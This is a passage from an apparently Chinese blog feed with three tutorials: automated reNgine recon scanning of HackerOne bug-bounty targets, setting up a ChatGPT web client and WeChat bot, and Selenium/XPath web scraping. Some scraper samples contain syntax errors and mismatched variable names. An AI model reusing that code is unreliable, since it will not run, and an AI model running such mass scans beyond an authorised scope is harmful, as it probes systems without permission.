plaintext"><table><tr><td class="code"><pre><span class="line">make up</span><br></pre></td></tr></table></figure><p>5.直接访问ip,用刚才注册的用户登录即可<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151126202.png"></p><h1 id="2-使用-配合hackone"><a href="#2-使用-配合hackone" class="headerlink" title="2.使用(配合hackone)"></a>2.使用(配合hackone)</h1><p>文档:<a href="https://rengine.wiki/usage/">https://rengine.wiki/usage/</a></p><h2 id="2-1设立目标"><a href="#2-1设立目标" class="headerlink" title="2.1设立目标"></a>2.1设立目标</h2><p>1.进入hackone找项目<br><a href="https://hackerone.com/opportunities/all">https://hackerone.com/opportunities/all</a><br>查找项目域名<br>以inDrive为例：<br>找到被授权的域名<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151144810.png"></p><p>2.rengine中添加目标<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151145857.png"></p><p>一次添加多个目标<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151149097.png"></p><p>3.在组织中创建一个组，将内容添加进去<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151151584.png"></p><h2 id="2-2自动化报告"><a href="#2-2自动化报告" class="headerlink" title="2.2自动化报告"></a>2.2自动化报告</h2><p>1.打开hackone settings<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151201456.png"><br>依据提示配置好username和api token</p><p>2.下方可调整报告样式<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151204874.png"></p><h2 id="2-3运行扫描"><a href="#2-3运行扫描" class="headerlink" title="2.3运行扫描"></a>2.3运行扫描</h2><p>1.Targets-&gt;全选-&gt;Scan Multiple Targets<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151229163.png"></p><p>2.选择扫描类型,Start Scan<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151230816.png"></p><p>3.等待扫描结果即可<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151209709.png"></p><h1 id="3-参考文章"><a href="#3-参考文章" class="headerlink" title="3.参考文章"></a>3.参考文章</h1><p><a href="https://wiki.sheep0818.xyz/doc/156/">https://wiki.sheep0818.xyz/doc/156/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChatGPT本地搭建与微信搭建</title>
      <link href="/2023/07/14/ChatGPT%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%BE%AE%E4%BF%A1%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/07/14/ChatGPT%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%BE%AE%E4%BF%A1%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="ChatGPT本地搭建与微信搭建"><a href="#ChatGPT本地搭建与微信搭建" class="headerlink" title="ChatGPT本地搭建与微信搭建"></a>ChatGPT本地搭建与微信搭建</h1><h2 id="1-本地搭建"><a href="#1-本地搭建" class="headerlink" title="1.本地搭建"></a>1.本地搭建</h2><p>获取api:<br><a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141404961.png"><br>点击Create new secret key</p><p>或者在如下链接中购买<br><a href="https://appsir.shop/product/wukClRPsAdq9fXI7">https://appsir.shop/product/wukClRPsAdq9fXI7</a></p><p>输入name后，得到KEY(API KEY一定要复制保存,只可以在这里看到一次key)<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141406933.png"><br>本地开源项目<br><a href="https://github.com/869413421/chatgpt-web">https://github.com/869413421/chatgpt-web</a><br>下载对应的版本即可，这里演示windows版<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141415340.png"><br>1.将config.dev.json文件名改为config.json<br>2.打开config.json完成相关内容的填写，可参考下图</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141440634.png"></p><p>运行chatgpt-web.exe,访问本地8088端口,输入用户名密码登陆后,即可使用</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141439226.png"></p><h2 id="2-在线微信搭建"><a href="#2-在线微信搭建" class="headerlink" title="2.在线微信搭建"></a>2.在线微信搭建</h2><p>需要环境:git golang</p><p>以debian为例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install git</span><br><span class="line">apt install golang</span><br><span class="line">如果从源下载go版本过低，可以参考这篇文章安装新版本</span><br><span class="line">https://blog.csdn.net/xiaochong0302/article/details/130666663</span><br></pre></td></tr></table></figure><p>项目地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://www.github.com/ZYallers/chatgpt_wechat_robot.git</span><br></pre></td></tr></table></figure><p>进入到项目目录,将json配置文件复制一份</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd chatgpt_wechat_robot</span><br><span class="line">cp config.dev.json config.json</span><br></pre></td></tr></table></figure><p>编辑config.json，将自己的apikey写进去<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141554405.png"></p><p>运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go run main.go</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307141915131.png"></p><p>访问网址，用闲置微信扫描二维码登录绑定,后即可使用</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307142029319.png"></p><p>使用实例:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307142029888.jpg"></p><p>挂后台使用可以用screen运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">screen go run main.go</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫-Selenium框架使用</title>
      <link href="/2023/07/13/Selenium%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/13/Selenium%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Selenium4-xpath"><a href="#Selenium4-xpath" class="headerlink" title="Selenium4+xpath"></a>Selenium4+xpath</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>  Selenium是当前广泛使用的开源自动化测试框架之一，它提供了丰富的工具和库，用于自动化测试Web应用程序。</p><p>  Selenium的主要功能是模拟用户与Web应用程序的交互，并能够自动化执行各种操作，如点击按钮、填写表单、验证页面元素等。通过这种方式，测试人员可以快速有效地执行大规模的测试，并验证应用程序在各种情况下的可靠性和稳定性。</p><p>  在实际渗透时,我们有时需要模拟人类对网站进行访问，或对网站进行某些自动化行为，我们可以借助Selenium框架实现。</p><h2 id="2-xpath"><a href="#2-xpath" class="headerlink" title="2.xpath"></a>2.xpath</h2><h3 id="2-1xpath简介"><a href="#2-1xpath简介" class="headerlink" title="2.1xpath简介"></a>2.1xpath简介</h3><p>XPath使用一种类似于目录结构的路径表达式，该表达式可以从根节点开始或当前节点开始，通过层级关系和条件筛选来定位所需的节点。XPath支持广泛的节点选择符号，如标签名、属性值、位置、逻辑运算符等，从而实现灵活的节点选择和过滤。</p><h3 id="2-2安装模块"><a href="#2-2安装模块" class="headerlink" title="2.2安装模块"></a>2.2安装模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install lxml</span><br></pre></td></tr></table></figure><h3 id="2-3xpath使用"><a href="#2-3xpath使用" class="headerlink" title="2.3xpath使用"></a>2.3xpath使用</h3><h4 id="2-3-1-etree"><a href="#2-3-1-etree" class="headerlink" title="2.3.1.etree"></a><strong>2.3.1.etree</strong></h4><p>etree 把 html源码变成对象</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&quot;http://www.4399dmw.com/donghua/&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#网页的源码</span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#使用etree去转化html_doc,转化为了一个html的对象,此时element对象可以使用xpath语法</span></span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    <span class="built_in">print</span>(html.xpath(<span class="string">&quot;xpath语法&quot;</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="2-3-2xpath语法"><a href="#2-3-2xpath语法" class="headerlink" title="2.3.2xpath语法"></a><strong>2.3.2xpath语法</strong></h4><p>xpath语法中[1]就是第一个</p><p>基础用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//a查询当前HTML页面所有的a标签</span><br><span class="line">//a/@href当前html页面中所有a标签中的href的属性内容</span><br><span class="line">//a/text() 所有a标签中的文本内容</span><br></pre></td></tr></table></figure><p>属性处理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//img/@src拿到所有img标签中src的内容</span><br><span class="line">//a/img/@src 拿到所有a标签中的img标签里的src的内容</span><br><span class="line">//img[@alt=&#x27;某个值&#x27;]/@src 选择img标签中alt是某个值的标签并且提取src值</span><br></pre></td></tr></table></figure><p>class标签处理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//a[@class=&#x27;u-card&#x27;][1]/img 选到所有的a标签下的class的值为u-card中的第1个的img标签</span><br><span class="line">//div[@class=&#x27;lst-item&#x27;][3]/a[4]/img 选取页面中所有div且class等于lst-item选择其中第三个,在此之下选择第四个a标签下的img标签</span><br><span class="line">//div[@class=&#x27;lst-item&#x27;][1]/a[last()]/img 这里的a标签是选择最后一个</span><br></pre></td></tr></table></figure><p>p标签</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//p[text=&#x27;超变武兽第二季&#x27;]查找所有p标签中,文字内容是xxx的</span><br><span class="line">//p[contains(text(),&#x27;蜡笔&#x27;)] 查找所有p标签中,包含某些文字的</span><br><span class="line">//p[@*]页面中所有p标签凡是带有属性的都选出来</span><br></pre></td></tr></table></figure><p>div标签</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//div[@class=&#x27;lst-item&#x27;][2]/*</span><br><span class="line">将所有div标签class属性等于lst-item中的第二个中的所有内容</span><br><span class="line"></span><br><span class="line">//div[@class=&#x27;m-lst&#x27;]/div[position()=4]</span><br><span class="line">选择页面中所有class是m-ls的div中的第四个div</span><br></pre></td></tr></table></figure><h4 id="2-3-3实战"><a href="#2-3-3实战" class="headerlink" title="2.3.3实战"></a>2.3.3实战</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">url = <span class="string">&quot;http://www.4399dmw.com/search/dh-1-0-0-0-0-0-0/&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#网页的源码</span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#使用etree去转化html_doc,转化为了一个html的对象,此时element对象可以使用xpath语法</span></span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    donghuatitle = html.xpath(<span class="string">&quot;//div[@class=&#x27;u-ct&#x27;]/p[@class=&#x27;u-tt&#x27;]/text()&quot;</span>)</span><br><span class="line">    donghuapic = html.xpath(<span class="string">&quot;//div[@class=&#x27;lst&#x27;]/a/img/@data-src&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(donghuatitle)</span><br><span class="line">    <span class="built_in">print</span>(donghuapic)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>把每一页都爬下来,自动寻找下一页</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="comment">#页面内爬虫</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pachong</span>(<span class="params">url</span>):</span><br><span class="line">    url = url</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#网页的源码</span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#使用etree去转化html_doc,转化为了一个html的对象,此时element对象可以使用xpath语法</span></span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    donghuatitle = html.xpath(<span class="string">&quot;//div[@class=&#x27;u-ct&#x27;]/p[@class=&#x27;u-tt&#x27;]/text()&quot;</span>)</span><br><span class="line">    donghuapic = html.xpath(<span class="string">&quot;//div[@class=&#x27;lst&#x27;]/a/img/@data-src&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(donghuatitle)</span><br><span class="line">    <span class="built_in">print</span>(donghuapic)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#发现下一页</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_next_page</span>(<span class="params">url</span>):</span><br><span class="line">url = url</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;User-agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="comment">#网页的源码</span></span><br><span class="line">    html_doc = resp.content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    html = etree.HTML(html_doc)</span><br><span class="line">    next_page = html.xpath(<span class="string">&quot;//a[contains(text(),&#x27;下一页&#x27;)]/@href&quot;</span>)</span><br><span class="line">    really_next_page = <span class="string">&quot;http://www.4399.dmw.com&quot;</span>+nextpage[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">return</span> real_next_page</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&quot;http://www.4399dmw.com/search/dh-1-0-0-0-0-1-0/&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;开始爬行的url:&quot;</span>+url)</span><br><span class="line">            pachong(url)</span><br><span class="line">      url = find_next_page(url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;最后一页也爬行完了&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>在浏览器中中可下载xpath插件,方便写xpath语法匹配内容,</p><p>这里推荐</p><p><a href="https://chrome.google.com/webstore/detail/xpath-helper/hgimnogjllphhhkhlmebbmlgjoejdpjl?hl=zh-CN">https://chrome.google.com/webstore/detail/xpath-helper/hgimnogjllphhhkhlmebbmlgjoejdpjl?hl=zh-CN</a></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307121720420.png"></p><h2 id="3-selenium"><a href="#3-selenium" class="headerlink" title="3.selenium"></a>3.selenium</h2><h3 id="3-1简介"><a href="#3-1简介" class="headerlink" title="3.1简介"></a>3.1简介</h3><p>Selenium是一款强大的开源自动化测试工具，用于模拟和控制浏览器行为，实现对Web应用程序的自动化测试。它支持多种编程语言和浏览器，提供了丰富的功能和灵活的API，是开发人员和测试人员首选的自动化测试解决方案。</p><h3 id="3-2安装"><a href="#3-2安装" class="headerlink" title="3.2安装"></a>3.2安装</h3><p>1.selenium模块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure><p>手动下载chromedriver:</p><p><a href="https://vikyd.github.io/download-chromium-history-version/#/">https://vikyd.github.io/download-chromium-history-version/#/</a></p><p>注意:需要下载chrome对应版本的驱动使用</p><p>自动安装:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install webdriver-manager</span><br><span class="line">pip install packaging</span><br></pre></td></tr></table></figure><p>之后建立一文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from webdriver_manager.chrome import ChromeDriverManager</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(ChromeDriverManager().install())</span><br><span class="line">driver.get(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>进度条满后自动则安装成功</p><h3 id="3-3使用"><a href="#3-3使用" class="headerlink" title="3.3使用"></a>3.3使用</h3><p>1.打开网页</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&quot;https://www.baidu.com/&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>2.按键包</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#引入键盘按键包</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line">    driver.find_element(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;this s a test&quot;</span>)</span><br><span class="line">    <span class="comment">#组合键输入键盘上的ctrl+a</span></span><br><span class="line">    driver.find_element(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;kw&quot;</span>).send_keys(Keys.CONTROL,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment">#输入键盘上的ENTER</span></span><br><span class="line">    driver.find_element(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;kw&quot;</span>).send_keys(Keys.ENTER)</span><br></pre></td></tr></table></figure><p>3.配置浏览器启动使用Option类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入Option类</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="comment"># 实例化一个Option类的对象</span></span><br><span class="line">options = Options()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置浏览器显示大小</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;--window-size=1366,768&#x27;</span>)  </span><br><span class="line"><span class="comment">#Option还常用一下</span></span><br><span class="line"><span class="comment">#--user-agent=&quot;&quot; 设置请求头的User-Agent</span></span><br><span class="line"><span class="comment">#--window-size=1366,768 设置浏览器分辨率（窗口大小）</span></span><br><span class="line"><span class="comment">#--headless 无界面运行（无窗口）</span></span><br><span class="line"><span class="comment">#--start-maximized 最大化运行（全屏窗口）</span></span><br><span class="line"><span class="comment">#--incognito 隐身模式（无痕模式）</span></span><br><span class="line"><span class="comment">#--disable-javascript 禁用javascript</span></span><br><span class="line"><span class="comment">#--disable-infobars 禁用浏览器正在被自动化程序控制的提示</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动浏览器，并将启动参数带入到浏览器中</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br></pre></td></tr></table></figure><p>4.设置启动型号</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置手机型号1</span></span><br><span class="line">mobileEmulation = &#123;<span class="string">&#x27;deviceName&#x27;</span>: <span class="string">&#x27;iPhone 6/7/8&#x27;</span>&#125;</span><br><span class="line"><span class="comment">#设置手机型号2</span></span><br><span class="line">mobileEmulation = &#123;</span><br><span class="line">    <span class="string">&quot;deviceMetrics&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;width&quot;</span>:<span class="number">350</span>,</span><br><span class="line">        <span class="string">&quot;height&quot;</span>:<span class="number">200</span>,</span><br><span class="line">        <span class="string">&quot;pixelRatio&quot;</span>:<span class="number">3.0</span>,</span><br><span class="line">        <span class="string">&quot;touch&quot;</span>:<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 使用手机浏览</span></span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;mobileEmulation&#x27;</span>, mobileEmulation)</span><br></pre></td></tr></table></figure><p>5.模拟点击</p><p>手机下操作鼠标!!有时候页面存在覆盖层,需要点击两次</p><p>这里像素点的获取推荐使用google插件Page Ruler Smart</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="comment">#点击70.120像素</span></span><br><span class="line">action = ActionChains(driver).move_by_offset(<span class="number">70</span>,<span class="number">120</span>).click()</span><br><span class="line"><span class="comment">#开始执行</span></span><br><span class="line">action.perform()</span><br><span class="line"><span class="comment">#移回鼠标</span></span><br><span class="line">ActionChains(driver).move_by_offset(-<span class="number">70</span>,-<span class="number">120</span>).perform()</span><br></pre></td></tr></table></figure><p>6.模拟悬停</p><p>获取登录位置示例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line">driver.get(<span class="string">&quot;https://www.bilibili.com/&quot;</span>)</span><br><span class="line">denglu = driver.find_element(By.XPATH,<span class="string">&quot;//div[@class=&#x27;header-login-entry&#x27;]&quot;</span>)</span><br><span class="line">ActionChains(driver).move_to_element(denglu).click().perform()</span><br></pre></td></tr></table></figure><p>点击可以一次执行多个</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line">driver.get(<span class="string">&quot;https://www.bilibili.com/&quot;</span>)</span><br><span class="line"><span class="comment">#定位到频道</span></span><br><span class="line">pingdao = driver.find_element(By.XPATH,<span class="string">&quot;//div[@class=&#x27;icon-bg icon-bg__channel&#x27;]&quot;</span>)</span><br><span class="line"><span class="comment">#定位到登录</span></span><br><span class="line">denglu = driver.find_element(By.XPATH,<span class="string">&quot;//div[@class=&#x27;header-login-entry&#x27;]&quot;</span>)</span><br><span class="line">action = ActionChains(driver)</span><br><span class="line">action.click(pingdao)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">action.click(denglu)</span><br><span class="line">action.perform()</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>测试结果:先点击频道,后点击登录</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307130003342.png"></p><h3 id="3-4模拟人类操作"><a href="#3-4模拟人类操作" class="headerlink" title="3.4模拟人类操作"></a>3.4模拟人类操作</h3><p>1.手机处理拖拽操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动浏览器，并将启动参数带入到浏览器中</span></span><br><span class="line">driver = webdriver.Chrome(options=options)</span><br><span class="line">driver.get(<span class="string">&quot;https://xrect1fy.github.io/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#拖拽操作</span></span><br><span class="line">first_tar = driver.find_element(By.XPATH,<span class="string">&quot;//a[@title=&#x27;Python基础(更新中)&#x27;and@class=&#x27;article-title&#x27;]&quot;</span>)</span><br><span class="line">second_tar = driver.find_element(By.XPATH,<span class="string">&quot;//h1&quot;</span>)</span><br><span class="line">action = ActionChains(driver)</span><br><span class="line">action.drag_and_drop(first_tar,second_tar).perform()</span><br></pre></td></tr></table></figure><p>拖拽操作需要使用xpath或者其他方法找到起始位置和终末位置</p><p>first_tar是初始位置,second_tar是终末位置</p><p>初始:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307130017161.png"></p><p>终末:</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307130018316.png"></p><p>2.鼠标点击像素的操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ActionChains(driver).move_by_offset(<span class="number">200</span>,<span class="number">300</span>).click().perform()</span><br><span class="line">ActionChains(driver).move_by_offset(-<span class="number">200</span>,<span class="number">300</span>)</span><br></pre></td></tr></table></figure><p>3.点击写入只能一个一个字按</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ActionChains(driver).move_by_offset(<span class="number">500</span>,<span class="number">95</span>).click().key_down(<span class="string">&quot;a&quot;</span>).perform()</span><br><span class="line">ActionChains(driver).move_by_offset(-<span class="number">500</span>,-<span class="number">95</span>).perform()</span><br></pre></td></tr></table></figure><p>鼠标操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">click()点击鼠标左键</span><br><span class="line">click and hold() 点击鼠标左键不放</span><br><span class="line">context_click() 点击鼠标右键不放</span><br><span class="line">double_click() 双击鼠标左键</span><br><span class="line">drag_and_drop()鼠标拖拽</span><br><span class="line">drag_and_drop_by_offset()鼠标拖拽到哪个坐标然后松开</span><br><span class="line">key_down(&quot;a&quot;)按下一个键</span><br><span class="line">key_up(&quot;a&quot;)抬起一个键</span><br><span class="line">move_to_element(ele)移动鼠标到某个元素的位置</span><br><span class="line">move_to_element_with_offset(ele,100,0) 移动到某个元素的相对多少距离</span><br></pre></td></tr></table></figure><p>根据像素拖拽</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#拖拽操作</span></span><br><span class="line">action = ActionChains(driver)</span><br><span class="line">first_tar = driver.find_element(By.XPATH,<span class="string">&quot;//a[@title=&#x27;XSS基础&#x27;and@class=&#x27;article-title&#x27;]&quot;</span>)</span><br><span class="line">ActionChains(driver).drag_and_drop_by_offset(first_tar,<span class="number">0</span>,<span class="number">10</span>).perform()</span><br></pre></td></tr></table></figure><p>4.处理下拉框</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> Select</span><br><span class="line">ele = driver.find_element(By.XPATH,<span class="string">&quot;//select[@class=&#x27;year&#x27;]&quot;</span>)</span><br><span class="line"><span class="comment">#使用select包裹起来xpath查找到的select元素</span></span><br><span class="line">select1 = Select(ele)</span><br><span class="line"><span class="comment">#选择值是动漫专区</span></span><br><span class="line">result = select1.select_by_value(<span class="string">&quot;动漫专区&quot;</span>)</span><br></pre></td></tr></table></figure><p>5.新建选项卡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#打开新标签页</span></span><br><span class="line">js = <span class="string">&#x27;window.open(&quot;http://www.baidu.com&quot;)&#x27;</span></span><br><span class="line">driver.execute_script(js)</span><br></pre></td></tr></table></figure><p>6.窗口切换</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(driver.current_url)</span><br><span class="line"><span class="comment">#切换窗口</span></span><br><span class="line">driver.switch_to.window(driver.window_handles[<span class="number">1</span>])</span><br><span class="line"><span class="comment">#切换回初始窗口</span></span><br><span class="line">driver.switch_to.window(driver.window_handles[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#window_handles列表先后记录了打开窗口的句柄</span></span><br></pre></td></tr></table></figure><p>7.关于iframe的处理</p><p>论坛</p><p>寻找到iframe的位置,聚焦转换到iframe上</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">find_div = driver.find_element(定位的元素)</span><br><span class="line">driver.switch_to.frame(find_div)</span><br></pre></td></tr></table></figure><p>释放iframe,回到主页上!!</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#释放iframe,回到主页上</span></span><br><span class="line">driver.switch_to.default_content()</span><br></pre></td></tr></table></figure><p>8.处理弹窗</p><figure class="highlight python"><table><tr><td class="code"><pre><span 